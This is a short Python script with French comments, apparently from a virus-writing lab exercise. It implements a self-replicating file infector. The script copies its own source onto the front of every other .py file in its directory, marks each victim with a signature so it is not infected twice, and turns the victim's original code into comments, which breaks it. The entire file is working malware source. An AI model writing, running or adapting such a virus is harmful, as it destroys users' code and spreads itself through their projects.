# infection par prépendage + signature

import os

SIGNATURE = "# === MARQUEUR_VIRUS_LAB ==="

def est_deja_infecte(chemin):
    try:
        with open(chemin, "r", encoding="utf-8") as f:
            return SIGNATURE in f.read()
    except (UnicodeDecodeError, PermissionError):
        return False

def code_du_virus():
    with open(os.path.abspath(__file__), "r", encoding="utf-8") as f:
        return f.read()

def infecter(chemin):
    if est_deja_infecte(chemin):
        print(f"  [=] Déjà infecté : {os.path.basename(chemin)}")
        return False
    try:
        with open(chemin, "r", encoding="utf-8") as f:
            original = f.read()
        contenu = (
            f"{SIGNATURE}\n"
            f"{code_du_virus()}\n"
            f"{original.replace(chr(10), chr(10) + '# ')}\n"
        )
        with open(chemin, "w", encoding="utf-8") as f:
            f.write(contenu)
        print(f"  [+] Infecté : {os.path.basename(chemin)}")
        return True
    except Exception as e:
        print(f"  [!] Erreur : {e}")
        return False

def propager(repertoire):
    virus_abs = os.path.abspath(__file__)
    for nom in os.listdir(repertoire):
        chemin = os.path.join(repertoire, nom)
        if os.path.isfile(chemin) and chemin.endswith(".py") \
           and os.path.abspath(chemin) != virus_abs:
            infecter(chemin)

if __name__ == "__main__":
    repertoire = os.path.dirname(os.path.abspath(__file__))
    print("[ÉTAPE 2] Infection en cours...")
    propager(repertoire)